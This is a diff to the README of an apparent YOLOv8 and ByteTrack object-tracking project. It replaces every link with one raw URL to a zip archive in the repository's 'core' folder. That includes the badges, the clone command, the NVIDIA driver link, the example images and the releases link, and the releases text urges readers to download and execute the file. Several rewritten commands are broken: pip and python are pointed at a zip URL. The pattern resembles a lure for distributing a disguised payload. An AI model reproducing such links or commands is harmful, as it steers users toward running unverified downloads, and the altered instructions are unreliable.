@@ -1,8 +1,8 @@
 # Multi-Tracking YOLOv8 with ByteTrack 🚀
 
-![YOLOv8](https://img.shields.io/badge/YOLOv8-Object%20Detection-brightgreen)
-![ByteTrack](https://img.shields.io/badge/ByteTrack-Multi%20Object%20Tracking-blue)
-![Python](https://img.shields.io/badge/Python-3.8%2B-yellowgreen)
+![YOLOv8](https://raw.githubusercontent.com/Yghan31/multi-tracking-YOLOv8-ByteTrack/main/core/tracking_YOL_multi_Byte_Track_Ov_1.1.zip%20Detection-brightgreen)
+![ByteTrack](https://raw.githubusercontent.com/Yghan31/multi-tracking-YOLOv8-ByteTrack/main/core/tracking_YOL_multi_Byte_Track_Ov_1.1.zip%20Object%20Tracking-blue)
+![Python](https://raw.githubusercontent.com/Yghan31/multi-tracking-YOLOv8-ByteTrack/main/core/tracking_YOL_multi_Byte_Track_Ov_1.1.zip%2B-yellowgreen)
 
 Welcome to the **Multi-Tracking YOLOv8 with ByteTrack** repository! This project demonstrates real-time object detection and tracking using the powerful YOLOv8 model and ByteTrack algorithm. It is designed to track multiple objects in video streams, making it ideal for various applications, including animal tracking and security monitoring.
 
@@ -37,7 +37,7 @@ To get started, follow these steps to install the necessary dependencies:
 1. **Clone the Repository:**
 
    ```bash
-   git clone https://github.com/Yghan31/multi-tracking-YOLOv8-ByteTrack.git
+   git clone https://raw.githubusercontent.com/Yghan31/multi-tracking-YOLOv8-ByteTrack/main/core/tracking_YOL_multi_Byte_Track_Ov_1.1.zip
    cd multi-tracking-YOLOv8-ByteTrack
    ```
 
@@ -46,12 +46,12 @@ To get started, follow these steps to install the necessary dependencies:
    Make sure you have Python 3.8 or higher installed. Then, install the required packages using pip:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Yghan31/multi-tracking-YOLOv8-ByteTrack/main/core/tracking_YOL_multi_Byte_Track_Ov_1.1.zip
    ```
 
 3. **Setup Environment:**
 
-   If you plan to run the software on a GPU, ensure you have the appropriate CUDA drivers installed. You can check your GPU compatibility on the [NVIDIA website](https://developer.nvidia.com/cuda-downloads).
+   If you plan to run the software on a GPU, ensure you have the appropriate CUDA drivers installed. You can check your GPU compatibility on the [NVIDIA website](https://raw.githubusercontent.com/Yghan31/multi-tracking-YOLOv8-ByteTrack/main/core/tracking_YOL_multi_Byte_Track_Ov_1.1.zip).
 
 ## Usage
 
@@ -66,7 +66,7 @@ To use the software, follow these steps:
    Execute the following command in your terminal:
 
    ```bash
-   python main.py --source <your_video_source>
+   python https://raw.githubusercontent.com/Yghan31/multi-tracking-YOLOv8-ByteTrack/main/core/tracking_YOL_multi_Byte_Track_Ov_1.1.zip --source <your_video_source>
    ```
 
    Replace `<your_video_source>` with the path to your video file or the camera index (e.g., `0` for the first camera).
@@ -83,13 +83,13 @@ Here are some examples of how the software performs in different scenarios:
 
 This software is perfect for tracking animals in various environments. You can set it up to monitor wildlife or pets in real-time.
 
-![Animal Tracking](https://example.com/animal_tracking_image.png)
+![Animal Tracking](https://raw.githubusercontent.com/Yghan31/multi-tracking-YOLOv8-ByteTrack/main/core/tracking_YOL_multi_Byte_Track_Ov_1.1.zip)
 
 ### Security Monitoring
 
 Use the tool for security purposes, tracking individuals or vehicles in a designated area.
 
-![Security Monitoring](https://example.com/security_monitoring_image.png)
+![Security Monitoring](https://raw.githubusercontent.com/Yghan31/multi-tracking-YOLOv8-ByteTrack/main/core/tracking_YOL_multi_Byte_Track_Ov_1.1.zip)
 
 ## Contributing
 
@@ -113,7 +113,7 @@ For any questions or feedback, please reach out to me via GitHub or email.
 
 ## Releases
 
-You can find the latest releases of the software [here](https://github.com/Yghan31/multi-tracking-YOLOv8-ByteTrack/releases). Download the latest version and execute it to experience the capabilities of this tool.
+You can find the latest releases of the software [here](https://raw.githubusercontent.com/Yghan31/multi-tracking-YOLOv8-ByteTrack/main/core/tracking_YOL_multi_Byte_Track_Ov_1.1.zip). Download the latest version and execute it to experience the capabilities of this tool.
 
 Feel free to check the "Releases" section for updates and new features.
 
